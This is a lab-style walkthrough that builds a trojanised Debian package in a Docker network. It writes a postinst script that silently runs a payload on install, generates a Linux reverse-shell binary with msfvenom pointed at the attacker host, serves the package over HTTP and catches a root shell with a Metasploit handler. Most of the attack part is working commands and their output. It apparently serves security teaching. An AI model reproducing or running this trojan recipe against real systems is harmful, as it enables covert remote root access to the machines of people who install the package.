Credits for this challenge go to KC Udonsi. We will use a malicious Debian package
(a trojan)
to install a RAT (Remote Admin Tool) into the target's device.

## Setup

***

As usual when working with networks, we start with our docker-compose file

```yaml
version: '3'

services:
    
  alice:
      image: # private image
      container_name: alice
      tty: true
      networks:
        internal:
          ipv4_address: 10.0.0.2
      cap_add:
        - NET_ADMIN
        - SYS_ADMIN
        
  mallory:
      image: # private image
      container_name: mallory
      tty: true
      restart: always
      cap_add:
        - NET_ADMIN
      volumes:
          - .:/shared
      networks:
        internal:
          ipv4_address: 10.0.0.3

networks:
  internal:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/24
```

and start the exercise with

```
$ docker-compse up -d
```

<br>

## Manipulating the Deb

***

We open an interactive shell for Mallory and start by extracting (`-x`) a legitimale deb file
`legitimate_0.1.0_all.deb`.

```
$ docker exec -it mallory bash
# dpkg -x legitimate_0.1.0_all.deb legitimate_0.1.0_all
```

next, we create a file `legitimate_0.1.0_all/DEBIAN/control` which contains

```
Package: legitimate
Version: 0.1.0
Section: misc
Priority: optional
Architecture: i386
Maintainer: mallory
Description: Just another trojan
```

; A second `legitimate_0.1.0_all/DEBIAN/postinst` with content

```sh
#!/bin/sh
chmod ugo+x /usr/share/payload && /usr/share/payload &
```

and give it execute permissions (`ugo` is to add permissions to the *owner*, *groups*, and *others*).

```
$ chmod ugo+x
```

<br>

## Injecting the Malware (msfvenom)

***

Finally, we can craft our Trojan Horse malware using `msfvenom`. This attack will
allow us to open a [reverse shell](https://en.wikipedia.org/wiki/Reverse_connection).

The used options here are

- `-a` specifies the architecture
- `-p` specifies the payload
- `-b` a list of "bad" characters or characters to avoid
- `-f` the output format
- `-o` the output file of the payload
- `LHOST` and `LPORT` are the IP and port we will be listening on for connections

```
# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=10.0.0.3 LPORT=443 -b "\x00" -f elf -o legitimate_0.1.0_all/usr/share/payload
```

Finally, we repackage the malware into a deb file

```
# dpkg-deb --build legitimate_0.1.0_all
```

All that remains now is to distribute the malware. For simplicity, we can have Mallory
run a server using

```
# python -m SimpleHTTPServer 80
```

Mallory can also open a second shell session again using Metasploit
[msfconsole](https://www.offensive-security.com/metasploit-unleashed/msfconsole/)
to handle the reverse shell server.

The options used are

- `-q` or **quiet** to not print the banner on startup
- `-x` to execute the string which follows as a command

```
# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 10.0.0.3; set LPORT 443; run; exit -y"
PAYLOAD => linux/x86/shell/reverse_tcp
LHOST => 10.0.0.3
LPORT => 443
[*] Started reverse TCP handler on 10.0.0.3:443
[*] Starting the payload handler...
```

## The Target Installs the Trojan

***

with these two open, we suppose Alice obtains and installs (`-i`) the file.

```
$ docker exec alice wget http://10.0.0.3/legitimate_0.1.0_all.deb
$ docker exec alice dpkg -i legitimate_0.1.0_all.deb
```

Upon installing, we notice Mallory's shell has updated

```
[*] Sending stage (36 bytes) to 10.0.0.2
[*] Command shell session 1 opened (10.0.0.3:443 -> 10.0.0.2:44088)
```

we now have a running shell and though it may be missing the traditional
prompt we see that commands still work as intended.

```
whoami
root
```

When you're done, don't forget to [clean up](/crypto/2020/10/08/05-lab.html#docker-cleanup)
after Docker.
